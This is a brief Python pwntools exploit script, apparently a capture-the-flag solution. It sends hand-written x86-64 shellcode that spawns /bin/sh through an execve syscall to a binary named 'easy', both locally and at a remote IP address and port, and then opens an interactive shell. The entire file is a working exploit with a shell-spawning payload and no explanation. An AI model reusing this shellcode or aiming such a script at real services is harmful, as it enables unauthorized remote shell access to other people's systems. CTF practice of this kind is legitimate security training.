from pwn import *

r = process('./easy')
r = remote('52.69.40.204',8361)
context.arch = 'amd64'
    #'\xf7\xe6'+\
    #'H1\xff'+\
    #'T'+\ #push rsp
    #'_'+\ #pop rdi
payload =\
    'H\xbf\x2ebin/sh\x00'+\
    'f\x83\xf7\x01'+\
    'W'+\
    'T'+\
    '_'+\
    '\xb0;'+\
    '\x0f\x05'
print disasm(payload)
raw_input('>>')
r.send(payload)

r.interactive()
